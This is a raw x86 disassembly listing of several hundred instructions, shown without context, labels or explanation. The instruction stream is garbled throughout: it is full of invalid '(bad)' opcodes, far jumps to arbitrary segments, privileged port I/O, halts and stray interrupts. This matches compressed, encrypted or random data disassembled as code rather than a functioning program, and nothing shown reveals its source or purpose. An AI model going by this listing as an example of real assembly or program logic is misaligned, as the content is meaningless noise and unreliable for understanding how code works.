  40c362:	test   eax,0x671863c1
  40c367:	das    
  40c368:	lock adc ebp,DWORD PTR [eax-0x29]
  40c36c:	neg    bl
  40c36e:	dec    edx
  40c36f:	adc    al,0x21
  40c372:	jp     0x40c366
  40c374:	or     edi,DWORD PTR [edx+0x62627d4f]
  40c37a:	loop   0x40c3cc
  40c37c:	push   esi
  40c37d:	jmp    0x8f56:0x29535767
  40c384:	xor    eax,0x2edead37
  40c389:	xor    edx,DWORD PTR [edi+0x5]
  40c38c:	inc    ebp
  40c38d:	test   DWORD PTR [ecx-0x3f089ab9],ecx
  40c393:	and    DWORD PTR cs:[edx+0x7de013dd],ecx
  40c39a:	fidiv  DWORD PTR [esi-0x21]
  40c39d:	dec    ebx
  40c39e:	(bad)  
  40c39f:	pop    ss
  40c3a0:	cmp    al,0xdf
  40c3a2:	loop   0x40c3e0
  40c3a4:	icebp  
  40c3a5:	mov    esi,0xc50b5dff
  40c3aa:	aam    0xea
  40c3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ad:	stc    
  40c3ae:	push   eax
  40c3af:	ds pop esi
  40c3b1:	adc    eax,0x7b07269a
  40c3b6:	mov    esi,0x689bab
  40c3bb:	(bad)  
  40c3bc:	jp     0x40c39d
  40c3be:	shl    BYTE PTR [edi],1
  40c3c0:	sub    DWORD PTR [esi-0x6a61bfe9],ebx
  40c3c6:	push   ebp
  40c3c7:	or     eax,0xa3fe2afe
  40c3cc:	xor    al,0xe
  40c3ce:	mov    ?,WORD PTR [edx-0x4aa3560]
  40c3d4:	daa    
  40c3d5:	adc    DWORD PTR [ebx-0x60e7cbb4],esp
  40c3db:	xor    eax,DWORD PTR [ecx-0x8]
  40c3de:	sbb    bl,ch
  40c3e0:	inc    ebp
  40c3e1:	enter  0x239a,0x9e
  40c3e5:	aas    
  40c3e6:	sbb    edi,DWORD PTR [edx+0x3e]
  40c3e9:	push   edi
  40c3ea:	sub    eax,0x1f5397cf
  40c3ef:	lea    ebp,[esi]
  40c3f1:	xor    BYTE PTR [edi+esi*2+0x1a3faaab],cl
  40c3f8:	add    eax,0x342cbcf7
  40c3fd:	push   ebx
  40c3fe:	dec    eax
  40c3ff:	popa   
  40c400:	pop    edx
  40c401:	aas    
  40c402:	not    DWORD PTR [edx-0x41c5eaca]
  40c408:	shr    DWORD PTR [ebx],0x2b
  40c40b:	and    al,0xc7
  40c40d:	inc    edx
  40c40e:	mov    edx,0xde330113
  40c413:	xor    BYTE PTR ds:0x72929935,cl
  40c419:	xchg   ebp,eax
  40c41a:	lahf   
  40c41b:	sahf   
  40c41c:	fbstp  TBYTE PTR [esi]
  40c41e:	cld    
  40c41f:	pop    ebp
  40c420:	out    dx,al
  40c421:	push   esi
  40c422:	jmp    0x40c445
  40c424:	shr    BYTE PTR [ebp*4+0x9f0b8ed],0x19
  40c42c:	and    dh,ah
  40c42e:	xor    DWORD PTR [ecx],eax
  40c430:	dec    esi
  40c431:	and    DWORD PTR ds:0x8e3bcf6f,ecx
  40c437:	dec    esi
  40c438:	cmp    edi,DWORD PTR [edx-0x6d39234c]
  40c43e:	xor    al,0x4c
  40c440:	nop
  40c441:	inc    ecx
  40c443:	jb     0x40c4ac
  40c445:	jnp    0x40c469
  40c447:	jge    0x40c468
  40c449:	push   edx
  40c44a:	ror    edi,1
  40c44c:	(bad)  
  40c44e:	pusha  
  40c44f:	outs   dx,BYTE PTR ds:[esi]
  40c450:	fcomp  DWORD PTR [edi]
  40c452:	sti    
  40c453:	push   es
  40c454:	fwait
  40c455:	shl    DWORD PTR [eax],cl
  40c457:	retf   0xebbb
  40c45a:	je     0x40c3e4
  40c45c:	addr16 daa 
  40c45e:	mul    BYTE PTR [esi+0x6c709137]
  40c464:	outs   dx,BYTE PTR ds:[esi]
  40c465:	jbe    0x40c45a
  40c467:	xor    eax,0xafba4c48
  40c46c:	or     al,0x54
  40c46e:	xchg   ebx,eax
  40c46f:	mov    bh,0x77
  40c471:	sti    
  40c472:	leave  
  40c473:	jge    0x40c462
  40c475:	in     al,dx
  40c476:	mov    esp,0xa0b44743
  40c47b:	xor    BYTE PTR [edx-0x69],ah
  40c47e:	je     0x40c473
  40c480:	clc    
  40c481:	cld    
  40c482:	clc    
  40c483:	or     cl,al
  40c485:	push   ss
  40c486:	test   DWORD PTR [ecx],ecx
  40c488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c489:	loop   0x40c4f9
  40c48b:	ss or  eax,0xe629d5a6
  40c491:	pop    ebx
  40c492:	dec    esi
  40c493:	imul   edx,esp,0x34
  40c496:	pop    ss
  40c497:	adc    cl,BYTE PTR [ebx-0x11]
  40c49a:	popa   
  40c49b:	popa   
  40c49c:	add    BYTE PTR [edi+0x62],cl
  40c49f:	fnsave [esi-0x5b]
  40c4a2:	and    BYTE PTR [edx-0x27534ba6],0xcc
  40c4a9:	push   ecx
  40c4aa:	ja     0x40c438
  40c4ac:	xor    al,0x6c
  40c4ae:	in     al,dx
  40c4af:	inc    ecx
  40c4b0:	xlat   BYTE PTR ds:[ebx]
  40c4b1:	outs   dx,DWORD PTR ds:[esi]
  40c4b2:	sub    ebx,DWORD PTR [edx-0xd]
  40c4b5:	mov    WORD PTR [esi+ebx*8-0x12],cs
  40c4b9:	imul   eax,DWORD PTR [edi-0x411e634c],0x744a49c
  40c4c3:	xchg   esi,eax
  40c4c4:	je     0x40c4d9
  40c4c6:	mov    BYTE PTR [eax-0xa40a21a],ch
  40c4cc:	inc    esp
  40c4cd:	or     eax,0x25648db3
  40c4d2:	dec    edi
  40c4d3:	arpl   WORD PTR [esi],si
  40c4d5:	pop    ecx
  40c4d6:	xor    DWORD PTR [edx-0x31],esi
  40c4d9:	mov    eax,0x95830976
  40c4de:	or     al,0xf
  40c4e0:	push   eax
  40c4e1:	std    
  40c4e2:	and    ebp,ebx
  40c4e4:	ja     0x40c46d
  40c4e6:	add    BYTE PTR [ecx+eax*1],dl
  40c4e9:	punpckhwd mm7,QWORD PTR [edx+0x14]
  40c4ed:	mov    ah,0x35
  40c4ef:	call   0xee63:0x52eb3a54
  40c4f6:	push   edi
  40c4f7:	lahf   
  40c4f8:	inc    ebx
  40c4f9:	and    al,0x97
  40c4fb:	push   esi
  40c4fc:	or     dh,ch
  40c4fe:	fistp  QWORD PTR [ecx]
  40c500:	and    esi,DWORD PTR [edi+0x4700b7de]
  40c506:	leave  
  40c507:	pusha  
  40c508:	pop    ebx
  40c509:	push   edi
  40c50a:	cs xchg esp,eax
  40c50c:	dec    ecx
  40c50d:	pop    es
  40c50e:	sbb    DWORD PTR [ebp-0x44],eax
  40c511:	int3   
  40c512:	jo     0x40c4b4
  40c514:	adc    ebx,DWORD PTR [ecx]
  40c516:	aaa    
  40c517:	mul    ah
  40c519:	dec    edi
  40c51a:	xchg   DWORD PTR [ebx],ebx
  40c51c:	dec    esp
  40c51d:	retf   
  40c51e:	imul   edi,DWORD PTR [eax-0x4d],0x3a983fe2
  40c525:	pop    edx
  40c526:	sub    BYTE PTR [ebp+0x293dd3d4],cl
  40c52c:	push   esp
  40c52d:	scas   al,BYTE PTR es:[edi]
  40c52e:	sub    ebx,DWORD PTR [ecx+eax*1+0x39]
  40c532:	jmp    0xccda:0xfd240d1d
  40c539:	aad    0xd9
  40c53b:	int    0x4c
  40c53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c53e:	push   ebp
  40c53f:	sbb    dl,BYTE PTR [ecx+ecx*2+0x6c]
  40c543:	push   0x173b3dd4
  40c548:	mov    bh,0x8b
  40c54a:	pop    ebx
  40c54b:	scas   eax,DWORD PTR es:[edi]
  40c54c:	(bad)  
  40c54d:	mov    ebx,0x92754bf
  40c552:	mov    esp,0x3e1ea1e2
  40c557:	stos   DWORD PTR es:[edi],eax
  40c558:	pop    esi
  40c559:	push   cs
  40c55a:	je     0x40c515
  40c55c:	mov    ch,0xa5
  40c55e:	xor    ebx,DWORD PTR [eax+0x4d55ad4d]
  40c564:	hlt    
  40c565:	sbb    al,0x52
  40c567:	repz inc eax
  40c569:	std    
  40c56a:	adc    ch,ah
  40c56c:	fst    QWORD PTR [edx-0x7]
  40c56f:	xchg   edi,eax
  40c570:	mov    edi,0xa148df98
  40c575:	adc    BYTE PTR [edx],0xb0
  40c578:	push   0x20
  40c57a:	xor    ebx,eax
  40c57c:	mov    edx,DWORD PTR [esi+0x3156c683]
  40c582:	test   eax,0xbd0b4245
  40c587:	stos   BYTE PTR es:[edi],al
  40c588:	pop    es
  40c589:	add    eax,0xfed43c5d
  40c58e:	xchg   ebp,eax
  40c58f:	or     DWORD PTR [ebx],ecx
  40c591:	dec    ebp
  40c592:	leave  
  40c593:	mov    esi,0x1fb0df8a
  40c598:	stos   BYTE PTR es:[edi],al
  40c599:	loopne 0x40c5d7
  40c59b:	adc    bh,BYTE PTR es:[edi+0x182d2092]
  40c5a2:	shr    DWORD PTR [ecx],1
  40c5a4:	xor    eax,ebp
  40c5a6:	imul   ebx,DWORD PTR [eax-0x59],0xd74cce5d
  40c5ad:	jae    0x40c533
  40c5af:	(bad)  
  40c5b0:	fidiv  DWORD PTR [esi+0x42]
  40c5b3:	lock jmp 0x352a304e
  40c5b9:	xlat   BYTE PTR ds:[ebx]
  40c5ba:	loope  0x40c5bd
  40c5bc:	pop    ecx
  40c5bd:	mov    dl,0x22
  40c5bf:	adc    ah,BYTE PTR [edi]
  40c5c1:	jmp    0x8f7f078
  40c5c6:	int3   
  40c5c7:	push   ebp
  40c5c8:	jmp    0x9150:0xe77d24d2
  40c5cf:	push   cs
  40c5d0:	jp     0x40c5ce
  40c5d2:	xchg   esi,eax
  40c5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d4:	mov    ds:0xea6b05f8,eax
  40c5d9:	cmp    BYTE PTR [esi-0x3ce05f00],al
  40c5df:	push   es
  40c5e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5e1:	inc    edx
  40c5e2:	and    dh,BYTE PTR [edi-0x1d5384a5]
  40c5e8:	fisttp WORD PTR [eax]
  40c5ea:	xchg   ebp,eax
  40c5eb:	fild   DWORD PTR [eax-0x455c100d]
  40c5f1:	xor    edx,DWORD PTR [ecx-0x20b738ce]
  40c5f7:	in     al,dx
  40c5f8:	es mov dh,ah
  40c5fb:	push   ds
  40c5fc:	mov    dh,0xa7
  40c5fe:	pop    ss
  40c5ff:	int3   
  40c600:	or     al,0xfa
  40c602:	jg     0x40c5d5
  40c604:	and    esi,0xffffff9a
  40c607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c608:	mov    ebp,0x9e3f4acd
  40c60d:	outs   dx,DWORD PTR ds:[esi]
  40c60e:	xchg   ecx,eax
  40c60f:	js     0x40c62d
  40c611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c612:	cld    
  40c613:	in     eax,0xb5
  40c615:	xchg   ebp,eax
  40c616:	aas    
  40c617:	rcl    BYTE PTR [ecx+0x19d0e930],1
  40c61d:	scas   eax,DWORD PTR es:[edi]
  40c61e:	push   0x2bdd93e5
  40c623:	add    al,0x16
  40c625:	int    0xdd
  40c627:	imul   edi,DWORD PTR [edx+0x8d8518a],0x56
  40c62e:	imul   BYTE PTR [esi+0x25]
  40c631:	stc    
  40c632:	clc    
  40c633:	js     0x40c688
  40c635:	(bad)  
  40c636:	pushf  
  40c637:	int3   
  40c638:	dec    eax
  40c639:	pop    edi
  40c63a:	and    ebx,ecx
  40c63c:	mov    edx,0xeff8fdee
  40c641:	pop    edi
  40c642:	or     DWORD PTR [edi+0xe],0x130defe
  40c649:	dec    ebp
  40c64a:	add    DWORD PTR [esi+0x10],edi
  40c64d:	cmp    ebp,DWORD PTR [edi-0x9c24455]
  40c653:	test   eax,0xc30ec6f
  40c658:	xchg   edi,eax
  40c659:	rol    DWORD PTR [edx],0x81
  40c65c:	sbb    DWORD PTR ds:0x5c2f278,0xfe3bb63a
  40c666:	adc    BYTE PTR [eax],dl
  40c668:	fadd   DWORD PTR [edi]
  40c66a:	ss enter 0x4177,0xc6
  40c66f:	lds    edx,FWORD PTR [ebx]
  40c671:	lods   eax,DWORD PTR ds:[esi]
  40c672:	pushf  
  40c673:	ffree  st(2)
  40c675:	or     DWORD PTR [ebx-0x6],ebp
  40c678:	cmc    
  40c679:	xchg   BYTE PTR [edi+ebx*2-0x8],ah
  40c67d:	cdq    
  40c67e:	popf   
  40c67f:	push   edx
  40c680:	call   0x1cb1:0x97337e14
  40c687:	or     al,0x16
  40c689:	test   DWORD PTR [esi-0x47],ebx
  40c68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68d:	pop    es
  40c68e:	dec    ecx
  40c68f:	out    0x7a,eax
  40c691:	lahf   
  40c692:	sar    DWORD PTR [ebx],0x51
  40c695:	mov    al,ds:0x6a63841e
  40c69a:	sbb    edx,DWORD PTR [eax+0x33]
  40c69d:	push   ds
  40c69e:	mov    BYTE PTR [ecx],cl
  40c6a0:	mov    al,ds:0x3f33b525
  40c6a5:	fcomp  st(7)
  40c6a7:	jecxz  0x40c62f
  40c6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6aa:	clc    
  40c6ab:	mov    bl,BYTE PTR [edi-0x1496ca7f]
  40c6b1:	cmp    ecx,DWORD PTR [ebp+0x41415367]
  40c6b7:	retf   
  40c6b8:	sub    dh,bh
  40c6ba:	adc    al,0x3c
  40c6bc:	and    bl,BYTE PTR [esi+0x9f53aea]
  40c6c2:	jo     0x40c6a6
  40c6c4:	jp     0x40c6bf
  40c6c6:	js     0x40c6dc
  40c6c8:	xor    DWORD PTR [eax],ecx
  40c6ca:	pushf  
  40c6cb:	je     0x40c657
  40c6cd:	imul   ecx,esi,0xad71f0db
  40c6d3:	jle    0x40c73c
  40c6d5:	gs pop edi
  40c6d7:	mov    WORD PTR [edx],ss
  40c6d9:	mov    edi,0x28a1ff68
  40c6de:	aam    0x7b
  40c6e0:	mov    bh,0xb4
  40c6e2:	(bad)  
  40c6e3:	adc    BYTE PTR [di+0x3d],dl
  40c6e7:	mov    es,WORD PTR ds:0xc9626975
  40c6ed:	jmp    0xb24a:0x3527a5b8
  40c6f4:	addr16 fwait
  40c6f6:	mov    cl,0xe9
  40c6f8:	stc    
  40c6f9:	repz cmp BYTE PTR [ebp+0x66],bl
  40c6fd:	push   ds
  40c6fe:	or     edi,DWORD PTR [eax+eiz*8-0x3172b507]
  40c705:	dec    BYTE PTR [ebx+ecx*8]
  40c708:	dec    esp
  40c709:	push   ebx
  40c70a:	es in  al,dx
  40c70c:	push   es
  40c70d:	mov    al,ds:0x17bf8ce0
  40c712:	cs icebp 
  40c714:	jle    0x40c76e
  40c716:	test   BYTE PTR [edx],ch
  40c718:	out    0xb9,eax
  40c71a:	test   BYTE PTR [edi+eax*1],ch
  40c71d:	mov    esp,DWORD PTR [ebx-0x75910fe8]
  40c723:	push   edx
  40c724:	sbb    al,0x41
  40c726:	mov    edx,0x21572699
  40c72b:	mov    dl,0xbd
  40c72d:	lea    edi,[ecx]
  40c72f:	or     DWORD PTR [ebx-0x58b9b1cd],ebp
  40c735:	xor    dh,ch
  40c737:	pop    edi
  40c738:	xchg   ebx,eax
  40c739:	lahf   
  40c73a:	xor    al,BYTE PTR [edx-0x73eb2d49]
  40c740:	inc    eax
  40c741:	int3   
  40c742:	dec    ebp
  40c743:	jmp    DWORD PTR [edi]
  40c745:	mov    esp,edi
  40c747:	retf   0x5f51
  40c74a:	rcr    BYTE PTR ds:0xde82312f,1
  40c750:	adc    al,0xcb
  40c752:	jp     0x40c7c0
  40c754:	pop    esp
  40c755:	pop    edx
  40c756:	add    eax,0x68de179a
  40c75b:	cld    
  40c75c:	or     eax,0x35a2d60d
  40c761:	lahf   
  40c762:	sbb    bl,BYTE PTR [ecx-0x57a7c5a2]
  40c768:	aam    0x63
  40c76a:	mov    esp,0xdbf914be
  40c76f:	push   eax
  40c770:	push   cs
  40c771:	add    DWORD PTR [ebx+0x15172a55],eax
  40c777:	js     0x40c7c7
  40c779:	jmp    0x1d056903
  40c77e:	pop    ecx
  40c77f:	sub    al,0xc0
  40c781:	call   0xd0a7cea8
  40c786:	xor    BYTE PTR [edx-0x6d],0x99
  40c78a:	popf   
  40c78b:	aam    0xba
  40c78d:	out    0x5e,eax
  40c78f:	push   ebp
  40c790:	pusha  
  40c791:	adc    esi,esp
  40c793:	sub    eax,0x45fc90aa
  40c798:	jns    0x40c7c3
  40c79a:	aad    0x39
  40c79c:	pop    ebx
  40c79d:	mov    ds:0xeabcb6d2,eax
  40c7a2:	ror    DWORD PTR [edx+esi*8-0x4f],0xe
  40c7a7:	xchg   esi,eax
  40c7a8:	out    0x6c,eax
  40c7aa:	push   ds
  40c7ab:	dec    ebx
  40c7ac:	jg     0x40c739
  40c7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7af:	inc    edx
  40c7b0:	test   al,0xfc
  40c7b2:	(bad)
  40c7b5:	stc    
  40c7b6:	shr    BYTE PTR [edx-0x9],cl
  40c7b9:	adc    DWORD PTR [ecx],esi
  40c7bb:	pop    ebp
  40c7bc:	gs jg  0x40c784
  40c7bf:	pop    edi
  40c7c0:	dec    esi
  40c7c2:	xchg   DWORD PTR [edi-0x68],edx
  40c7c5:	pop    esp
  40c7c6:	xchg   esi,eax
  40c7c7:	jnp    0x40c7a3
  40c7c9:	(bad)  
  40c7cb:	popf   
  40c7cc:	fs jbe 0x40c7db
  40c7cf:	push   es
  40c7d0:	add    eax,0x3e9ed2fd
  40c7d5:	sub    cl,BYTE PTR [ebx-0x17]
  40c7d8:	(bad)  
  40c7d9:	(bad)  
  40c7da:	fldenv [ecx]
  40c7dc:	stc    
  40c7dd:	lds    eax,FWORD PTR [esi+esi*8+0x6627a427]
  40c7e4:	and    bh,BYTE PTR [edx+0x5401c930]
  40c7ea:	add    cl,dl
  40c7ec:	sahf   
  40c7ed:	idiv   BYTE PTR [ebx+0x7b]
  40c7f0:	and    DWORD PTR [esi+esi*8],edi
  40c7f3:	int    0x49
  40c7f5:	and    al,dl
  40c7f7:	in     al,0x80
  40c7f9:	sub    BYTE PTR [esi+0x2],cl
  40c7fc:	enter  0xac4f,0x3b
  40c800:	fiadd  WORD PTR [esi+edi*8+0x3a]
  40c804:	jmp    esi
  40c806:	inc    ebx
  40c807:	test   ah,0x64
  40c80a:	test   BYTE PTR [edi+esi*2+0x57],dh
  40c80e:	cwde   
  40c80f:	(bad)  
  40c810:	out    dx,eax
  40c811:	mov    eax,0x71bf480f
  40c816:	push   cs
  40c817:	out    0xb2,eax
  40c819:	xchg   edx,eax
  40c81a:	fisttp DWORD PTR [ebx+0x47]
  40c81d:	adc    BYTE PTR [ebp+0xd],ah
  40c820:	call   0xcb8d604b
  40c825:	lods   eax,DWORD PTR ds:[esi]
  40c826:	and    esp,ebp
  40c828:	rol    BYTE PTR [edx-0x176adf35],0x1d
  40c82f:	mov    esp,0xd60b7ab4
  40c834:	sub    eax,0xb601583a
  40c839:	int    0x25
  40c83b:	adc    ah,dh
  40c83d:	xchg   DWORD PTR [edx+0x16],esp
  40c840:	adc    al,0x83
  40c842:	shl    DWORD PTR [esi-0x17409327],cl
  40c848:	sbb    ecx,DWORD PTR [ebx]
  40c84a:	loopne 0x40c857
  40c84c:	test   esi,ecx
  40c84e:	retf   
  40c84f:	retf   0xf7ee
  40c852:	mov    dh,0x4c
  40c854:	cmc    
  40c855:	enter  0x60bb,0x64
  40c859:	aaa    
  40c85a:	inc    ebp
  40c85b:	cmc    
  40c85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c85d:	retf   
  40c85e:	scas   eax,DWORD PTR es:[edi]
  40c85f:	pop    esp
  40c860:	dec    esi
  40c861:	leave  
  40c862:	jbe    0x40c83c
  40c864:	inc    edi
  40c865:	push   0xba54b9b3
  40c86a:	push   edi
  40c86b:	int    0xd6
  40c86d:	cmp    edx,DWORD PTR [edi+0x103b4f7]
  40c873:	inc    ebp
  40c874:	fidivr DWORD PTR [edi-0x4c]
  40c877:	jmp    0xebfb:0xd04910ce
  40c87e:	repz mov bh,0x2f
  40c881:	ds sti 
  40c883:	xor    cl,BYTE PTR [ebp+0x73]
  40c886:	xchg   ecx,eax
  40c887:	xor    DWORD PTR [ecx-0x78],edx
  40c88a:	outs   dx,BYTE PTR ds:[esi]
  40c88b:	mov    ebx,0xb8eca454
  40c890:	outs   dx,DWORD PTR ds:[esi]
  40c891:	mov    al,ds:0x7853fa40
  40c896:	test   al,0xeb
  40c898:	stos   DWORD PTR es:[edi],eax
  40c899:	cmp    dl,BYTE PTR [ebx]
  40c89b:	repz inc ebx
  40c89d:	imul   ebp,DWORD PTR [ecx],0xffffffe0
  40c8a0:	add    eax,0xe260ed74
  40c8a5:	inc    esi
  40c8a6:	dec    esi
  40c8a7:	add    eax,0x94f58cfa
  40c8ac:	ss jg  0x40c877
  40c8af:	push   esp
  40c8b0:	test   al,0xfb
  40c8b2:	rcl    DWORD PTR [edi-0x45c3c67c],1
  40c8b8:	je     0x40c904
  40c8ba:	stos   DWORD PTR es:[edi],eax
  40c8bb:	cld    
  40c8bc:	xchg   esi,eax
  40c8bd:	(bad)  
  40c8be:	sahf   
  40c8bf:	and    BYTE PTR [eax],ch
  40c8c1:	push   edi
  40c8c2:	or     BYTE PTR [eax+eax*2+0x9c96f11],dh
  40c8c9:	dec    eax
  40c8ca:	jp     0x40c8f2
  40c8cc:	mov    edi,DWORD PTR [esi+ebp*8]
  40c8cf:	adc    eax,0x95316fd4
  40c8d4:	std    
  40c8d5:	fwait
  40c8d6:	xchg   dl,ch
  40c8d8:	scas   eax,DWORD PTR es:[edi]
  40c8d9:	popa   
  40c8da:	jl     0x40c954
  40c8dc:	xchg   ecx,eax
  40c8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8de:	add    DWORD PTR [edx],ebx
  40c8e0:	dec    eax
  40c8e1:	mov    ebp,0xb0c89c9a
  40c8e6:	data16 (bad) 
  40c8e8:	cmc    
  40c8e9:	cmp    al,0xa2
  40c8eb:	test   eax,0x193e2efb
  40c8f0:	icebp  
  40c8f1:	rcr    BYTE PTR [eax],0x83
  40c8f4:	push   esi
  40c8f5:	push   ebx
  40c8f6:	add    esi,DWORD PTR [esi]
  40c8f8:	dec    ebx
  40c8f9:	ss xchg ebp,eax
  40c8fb:	and    eax,0x2bf28734
  40c900:	and    BYTE PTR [esi-0x384ef4cc],ch
  40c906:	cld    
  40c907:	push   es
  40c908:	xor    bl,BYTE PTR [ebp+eax*4-0xba42138]
  40c90f:	jb     0x40c8d0
  40c911:	dec    ebp
  40c912:	cmp    eax,0xbfe297b1
  40c917:	(bad)  
  40c918:	mov    BYTE PTR [ecx+eax*1-0x3e],ch
  40c91c:	in     al,0x36
  40c91e:	dec    eax
  40c91f:	dec    eax
  40c920:	cmp    al,0xb3
  40c922:	stos   DWORD PTR es:[edi],eax
  40c923:	test   DWORD PTR [ecx],ebx
  40c925:	cmp    eax,0x79b17bdf
  40c92a:	push   0x866b7dba
  40c92f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c930:	imul   eax,DWORD PTR [edi+0x3f],0x1e613bd7
  40c937:	mov    edx,0x10c09c3b
  40c93c:	jmp    0xf3d44fdc
  40c941:	cmp    ecx,DWORD PTR [ecx+0x60]
  40c944:	inc    eax
  40c945:	aaa    
  40c946:	add    bl,BYTE PTR [esi+0x1c]
  40c949:	mov    esi,gs
  40c94b:	jns    0x40c939
  40c94d:	imul   esp,DWORD PTR [ebp-0x12948337],0xca8a8c7b
  40c957:	jae    0x40c951
  40c959:	call   0x121679e6
  40c95e:	jmp    0xeca2:0x5a52c0f0
  40c965:	dec    DWORD PTR cs:[eax+esi*4+0x6c45f0a8]
  40c96d:	mov    ebp,0x782e5572
  40c972:	xchg   esi,eax
  40c973:	and    eax,esi
  40c975:	int    0x77
  40c977:	(bad)  
  40c978:	xlat   BYTE PTR ds:[ebx]
  40c979:	sti    
  40c97a:	or     al,0xdc
  40c97c:	push   ss
  40c97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c97e:	jmp    0x40c9c1
  40c980:	jge    0x40c932
  40c982:	pop    eax
  40c983:	fsub   QWORD PTR [eax-0x65]
  40c986:	jb     0x40c9f9
  40c988:	ja     0x40c9d9
  40c98a:	inc    esi
  40c98b:	jne    0x40c916
  40c98d:	sbb    eax,0x5aa65011
  40c992:	xchg   ecx,eax
  40c993:	xchg   edi,eax
  40c994:	shl    DWORD PTR [edi+0x67],cl
  40c997:	lds    ecx,FWORD PTR [eax]
  40c999:	mov    ch,0x4a
  40c99b:	mov    eax,ds:0xeadffa49
  40c9a0:	push   esp
  40c9a1:	scas   al,BYTE PTR es:[edi]
  40c9a2:	push   ebx
  40c9a3:	bound  ecx,QWORD PTR [ebx+0x2d]
  40c9a6:	adc    eax,0xc95623ad
  40c9ab:	xor    al,0xf0
  40c9ad:	in     eax,0xf0
  40c9af:	lock jp 0x40c96e
  40c9b2:	mov    ecx,0x2baed55c
  40c9b7:	push   edi
  40c9b8:	sub    al,0xe0
  40c9ba:	push   edi
  40c9bb:	(bad)  
  40c9bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9bd:	push   ds
  40c9be:	xchg   BYTE PTR [ebp-0x4b],bl
  40c9c1:	clc    
  40c9c2:	mov    al,ds:0x9638bd23
  40c9c7:	mov    ds:0xf5ecae1b,eax
  40c9cc:	ins    DWORD PTR es:[edi],dx
  40c9cd:	fsubr  QWORD PTR [esi+0x66]
  40c9d0:	push   0xce22e1e
  40c9d5:	in     eax,dx
  40c9d6:	loop   0x40c9e9
  40c9d8:	inc    edx
  40c9d9:	xchg   ebx,eax
  40c9da:	fiadd  DWORD PTR [esi+0x4a]
  40c9dd:	inc    ebp
  40c9de:	(bad)  
  40c9df:	mov    eax,0xf1ffdfa5
  40c9e4:	mov    dh,0xdb
  40c9e6:	adc    BYTE PTR [ecx+0xd],cl
  40c9e9:	jno    0x40ca25
  40c9eb:	add    ch,BYTE PTR [ebp+0x9]
  40c9ee:	mov    WORD PTR ds:0xf12d6edf,ss
  40c9f4:	pusha  
  40c9f5:	mul    bh
  40c9f7:	es xchg esp,eax
  40c9f9:	sbb    BYTE PTR [eax+0x30],bh
  40c9fc:	imul   eax,ebp,0xffffffbb
  40c9ff:	push   ss
  40ca00:	repz xor BYTE PTR [esi+0x7494f97],dl
  40ca07:	je     0x40c9c2
  40ca09:	mov    ah,0x22
  40ca0b:	and    DWORD PTR [edx],esi
  40ca0d:	pop    eax
  40ca0e:	mov    esi,0x6d80776a
  40ca13:	inc    eax
  40ca14:	jmp    0x40c9b3
  40ca16:	ja     0x40c9df
  40ca18:	dec    esi
  40ca19:	dec    esp
  40ca1a:	shl    esp,0x9f
  40ca1d:	stos   DWORD PTR es:[edi],eax
  40ca1e:	gs into 
  40ca20:	jp     0x40c9df
  40ca22:	pop    ebp
  40ca23:	stc    
  40ca24:	hlt    
  40ca25:	xor    DWORD PTR [edx-0x1c],eax
  40ca28:	jns    0x40c9e8
  40ca2a:	or     eax,0xbe9c62ad
  40ca2f:	out    0x6e,eax
  40ca31:	es mov edx,0xdced02f9
  40ca37:	cmp    eax,0x79d1b8d6
  40ca3c:	out    dx,eax
  40ca3d:	sub    ebp,DWORD PTR [edx-0x16]
  40ca40:	pushf  
  40ca41:	xor    ah,BYTE PTR [ebp+0x7f54eae3]
  40ca47:	bound  edi,QWORD PTR [ecx]
  40ca49:	mov    al,BYTE PTR [edi]
  40ca4b:	cwde   
  40ca4c:	scas   eax,DWORD PTR es:[edi]
  40ca4d:	enter  0xcb23,0xed
  40ca51:	js     0x40ca13
  40ca53:	into   
  40ca54:	aaa    
  40ca55:	or     eax,0x4286ec6
  40ca5a:	cmp    DWORD PTR [esi],esp
  40ca5c:	cld    
  40ca5d:	xor    al,0xb5
  40ca5f:	(bad)  
  40ca60:	cmp    ecx,ebp
  40ca62:	gs xchg ebx,eax
  40ca64:	fadd   st,st(4)
  40ca66:	jae    0x40cac1
  40ca68:	lods   al,BYTE PTR ds:[esi]
  40ca69:	(bad)  
  40ca6a:	inc    eax
  40ca6b:	and    edx,edx
  40ca6d:	add    al,0x6c
  40ca6f:	mov    ds:0x81d23965,eax
  40ca74:	xor    eax,0x594d9ec0
  40ca79:	jmp    0x8f908314
  40ca7e:	fsubr  QWORD PTR [edi+0xb71929]
  40ca84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca85:	ins    DWORD PTR es:[edi],dx
  40ca86:	stos   BYTE PTR es:[edi],al
  40ca87:	xchg   ebp,eax
  40ca88:	shl    BYTE PTR [ecx+ebx*2+0x4489e5e8],1
  40ca8f:	fidivr WORD PTR [edi+0x7b]
  40ca92:	push   0xd128d70
  40ca97:	test   al,0xf1
  40ca99:	push   ebp
  40ca9a:	ja     0x40cb18
  40ca9c:	cdq    
  40ca9d:	push   ecx
  40ca9e:	enter  0xc242,0x4c
  40caa2:	fist   DWORD PTR [ecx-0x19b08c66]
  40caa8:	test   BYTE PTR ds:[edx-0x45c41bff],cl
  40caaf:	dec    ebx
  40cab0:	pop    es
  40cab1:	out    0x1c,eax
  40cab3:	fdivr  DWORD PTR [ecx+0x66]
  40cab6:	hlt    
  40cab7:	or     BYTE PTR [ecx+eax*4+0x76],bh
  40cabb:	push   ebx
  40cabc:	out    0x32,al
  40cabe:	retf   0x7292
  40cac1:	push   ebp
  40cac2:	and    DWORD PTR [ecx-0x80],edi
  40cac5:	jae    0x40cb27
  40cac7:	adc    DWORD PTR [edi+0xd],ebp
